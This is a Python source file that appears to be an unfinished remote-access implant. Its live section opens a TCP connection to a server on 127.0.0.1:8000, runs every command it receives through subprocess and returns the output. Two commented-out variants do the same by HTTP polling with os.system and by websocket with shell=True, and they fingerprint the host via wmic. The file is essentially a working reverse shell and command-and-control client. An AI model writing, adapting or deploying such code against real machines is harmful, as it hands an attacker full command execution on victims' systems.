import subprocess
import time
import requests
import hashlib
import os
#pip3 install websocket-client
import websocket
import time
import rel
import socket

HOST = 'http://127.0.0.1:8000'

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.connect(('127.0.0.1',8000))
msg = "Connection Established"

while msg != 'exit':
    msg=server_socket.recv(2048).decode('utf-8')
    output = subprocess.getoutput(msg)
    if(output == '' ):
        output = "processing..."
    msg = bytes(output, 'utf-8')
    server_socket.sendall(msg)

server_socket.close()



"""

def check_cmd(client_id):
    req = requests.get(
        HOST + '/cmd',
        headers={
            'client-id': client_id
        }
    )
    cmd = requests.json()['cmd']
    os.system(cmd)
    output = subprocess.check_output("cat /etc/services", shell=True)
    requests.post(
        HOST + '/cmd',
        headers={
            'client-id': client_id
        },
        json={
            'output': output
        }
    )


def ping(client_id):
    req = requests.get(
        HOST + '/ping',
        headers={
            'client-id': client_id
        }
    )
    ping = req.json()['ping']
    return ping


def main():
    client = subprocess.check_output('wmic csproduct get UUID')
    client_id = hashlib.sha256(client.encode('utf-8')).hexdigest()
    while (True):   
        if ping(client_id):
            check_cmd(client_id)
        time.sleep(60 * 5)


if __name__ == '__main__':
    main()
    

#shouldnt use globals better approach
"""
#client = subprocess.check_output('wmic csproduct get UUID')
"""

client = "balls"
client_id = hashlib.sha256(client.encode('utf-8')).hexdigest()

def on_message(ws, message):
    # handle on_message
    if message == "exit":
        ws.close()
    elif message == "connected":
        pass
    else:
        try:
            output = subprocess.check_output(message, shell=True)
            print(output)
            ws.send(output)
        except:
            ws.send("[-] Error executing command")

def on_error(ws, error):
    # handle errors
    pass

def on_close(ws, close_status_code, close_msg):
    # handle on_close
    pass

def on_open(ws):
    while (True):
        time.sleep(5)
        ws.send("ping")

def main():
    ws = websocket.WebSocketApp(f"ws://127.0.0.1:8000/clientpool/{client_id}",
                              on_open=on_open,
                              on_message=on_message,
                              on_error=on_error,
                              on_close=on_close)

    ws.run_forever(dispatcher=rel, reconnect=5)
    rel.signal(2, rel.abort)
    rel.dispatch()

if __name__ == "__main__":
    main()
"""
